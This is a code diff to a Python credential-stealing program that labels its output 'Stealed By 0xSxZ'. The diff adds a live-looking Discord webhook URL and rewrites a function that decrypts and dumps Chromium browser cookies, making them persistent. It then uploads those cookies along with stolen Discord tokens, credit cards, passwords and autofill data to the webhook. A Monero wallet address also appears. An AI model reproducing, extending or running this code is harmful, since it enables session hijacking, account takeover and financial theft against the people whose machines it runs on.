@@ -58,7 +58,7 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1010620457176813578/Yo0ETX1u2D_8JA-MyeC9TNka0by_hHreORxkCb1ydyN9IcCjPJoYLkZwe6yMxeyniA52"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -266,53 +266,6 @@ if yes == "yes":
 			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
 
 	"""
-
-
-	def chromeCookies():
-		try:
-			chrcooks = ""
-			for i in range(len(chromiumpaths)):
-				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
-				print("Getting Chrome cookies : " + db_path)
-				if not os.path.exists(db_path):
-					continue
-				
-				filename =  str(uuid.uuid4()) + ".db"
-				if not os.path.isfile(filename):
-					shutil.copy(db_path, filename)
-				# connect to the database
-				db = sqlite3.connect(filename)
-				# ignore decoding errors
-				db.text_factory = lambda b: b.decode(errors="ignore")
-				cursor = db.cursor()
-				# get the cookies from `cookies` table
-				cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")
-				key = get_encryption_key(chromiumpaths[i])
-				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
-					decrypted_value = decrypt_data(encrypted_value, key)
-					if not value:
-						decrypted_value = decrypt_data(encrypted_value, key)
-					else:
-						chrcooks = chrcooks + f"""
-					Host: {host_key}
-					Cookie name: {name}
-					Cookie value (decrypted): {decrypted_value}
-					===============================================================
-					"""
-					# update the cookies table with the decrypted value
-					# and make session cookie persistent
-					cursor.execute("""
-					UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
-					WHERE host_key = ?
-					AND name = ?""", (decrypted_value, host_key, name))
-				# commit changes
-				db.commit()
-				# close connection
-				db.close()
-
-			return chrcooks
-		except Exception as e:
-			print(e)
 	def get_master_key(path):
 		with open(path, "r", encoding='utf-8') as f:
 			local_state = f.read()
@@ -343,6 +296,72 @@ if yes == "yes":
 			# print("Probably saved password from Chrome version older than v80\n")
 			# print(str(e))
 			return "Chrome < 80"
+
+	def chromeCookies():
+		try:
+			chrcooks = ""
+			for i in range(len(chromiumpaths)):
+				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
+				if not os.path.exists(db_path):
+					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Network\\Cookies"
+					if not os.path.exists(db_path):
+						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Network\\Cookies"
+						if not os.path.exists(db_path):
+							db_path = chromiumpaths[i]+ "\\Network\\Cookies"
+							if not os.path.exists(db_path):
+								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Network\\Cookies"
+								if not os.path.exists( str(chromiumpaths[i])+ "\\Network\\Cookies"):
+									print("Not existing")
+									continue
+				local_state_path = chromiumpaths[i]  + "\\Local State"
+				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
+					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
+					if not os.path.isfile(local_state_path):
+						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
+						if not os.path.isfile(local_state_path):
+							continue
+					print("Getting Chrome cookies : " + db_path)
+					if not os.path.exists(db_path):
+						continue
+				print("Getting Chrome cookies : " + db_path)
+				if not os.path.exists(db_path):
+					continue
+				
+				filename =  str(uuid.uuid4()) + ".db"
+				if not os.path.isfile(filename):
+					shutil.copy(db_path, filename)
+				# connect to the database
+				db = sqlite3.connect(filename)
+				# ignore decoding errors
+				db.text_factory = lambda b: b.decode(errors="ignore")
+				cursor = db.cursor()
+				# get the cookies from `cookies` table
+				cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM 'cookies'""")
+				key = get_encryption_key(local_state_path)
+				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+					decrypted_value = decrypt_password(encrypted_value, key)
+					chrcooks = chrcooks + f"""
+					Host: {host_key}
+					Cookie name: {name}
+					Cookie value (decrypted): {decrypted_value}
+					===============================================================
+					"""
+
+					# update the cookies table with the decrypted value
+					# and make session cookie persistent
+					cursor.execute("""
+					UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+					WHERE host_key = ?
+					AND name = ?""", (decrypted_value, host_key, name))
+				# commit changes
+				db.commit()
+				# close connection
+				db.close()
+
+			return chrcooks
+		except Exception as e:
+			print(e)
+
 	def main():
 		binks = "==============Stealed By 0xSxZ=============="
 		for i in range(len(chromiumpaths)):
@@ -763,10 +782,11 @@ if yes == "yes":
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
 		pwdd =main()
 		ccs = getccs()
+		cooky = chromeCookies()
 		print(ccs)
 		webhook.add_file(file=ccs, filename="Cr3d1t_C4rds.txt")
 		webhook.add_file(file=str(pwdd), filename="0xPasswords.txt")
-		
+		webhook.add_file(file=str(cooky), filename="0xCookies.txt")
 		try:
 			autofill = stealChromeWin()
 			autfill = str(autofill).split(":::667")
